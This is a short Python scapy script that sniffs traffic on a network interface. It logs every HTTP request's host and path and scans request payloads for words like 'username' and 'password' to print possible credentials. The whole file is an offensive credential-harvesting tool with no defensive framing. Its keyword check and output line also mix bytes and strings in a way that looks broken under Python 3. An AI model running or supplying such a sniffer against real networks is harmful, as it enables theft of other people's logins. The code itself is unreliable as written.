import scapy.all as scapy
from scapy.layers import http

import sys

interface = "Ethernet0"

def sniff_packets(interface):
  scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
  if packet.haslayer(http.HTTPRequest):
    host = packet[http.HTTPRequest].Host.decode('utf-8')
    path = packet[http.HTTPRequest].Path.decode('utf-8')
    print(f"[+] HTTP Request >> {host}{path}")
    
    if packet.haslayer(scapy.Raw):
      load = packet[scapy.Raw].load
      keywords = ["username", "user", "login", "password", "pass"]
      for keyword in keywords:
        if keyword in load:
          print("[+] Possible username/password > " + load)
          
  print(packet.summary())

try:  
  sniff_packets(interface)
except KeyboardInterrupt:
  print ("Exiting...")
  sys.exit(0)
